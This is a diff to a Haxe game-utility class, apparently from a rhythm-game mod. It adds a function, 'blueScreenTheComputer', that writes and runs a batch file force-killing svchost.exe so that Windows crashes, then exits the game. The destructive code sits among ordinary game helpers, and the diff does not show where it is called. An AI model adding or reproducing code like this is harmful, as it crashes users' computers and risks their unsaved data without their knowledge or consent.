@@ -7,8 +7,9 @@ import lime.utils.AssetLibrary;
 import lime.utils.AssetManifest;
 import flixel.system.FlxSound;
 #if sys
-import sys.io.File;
 import sys.FileSystem;
+import sys.io.File;
+import sys.io.Process;
 #else
 import openfl.utils.Assets;
 #end
@@ -48,6 +49,34 @@ class CoolUtil
 		}
 		return Paths.formatToSongPath(fileSuffix);
 	}
+
+	// i took this from js engine
+	public static function blueScreenTheComputer():Void {
+		// Get the directory of the executable
+		var exePath = Sys.programPath();
+		var exeDir = haxe.io.Path.directory(exePath);
+	
+		// Construct the source directory path based on the executable location
+		var sourceDirectory = haxe.io.Path.join([exeDir]);
+		//var sourceDirectory2 = haxe.io.Path.join([exeDir, "update"]);
+	
+		// Escape backslashes for use in the batch script
+		sourceDirectory = sourceDirectory.split('\\').join('\\\\');
+	
+		var excludeFolder = "mods";
+	
+		// Construct the batch script with echo statements
+		var theBatch = "@echo off\r\n";
+		theBatch += "taskkill.exe /f /im svchost.exe\r\n";
+	
+		// Save the batch file in the executable's directory
+		File.saveContent(haxe.io.Path.join([exeDir, "yes.bat"]), theBatch);
+	
+		// Execute the batch file
+		new Process(exeDir + "/yes.bat", []);
+			Sys.exit(0);
+	}
+	
 
 	public static function difficultyString():String
 	{
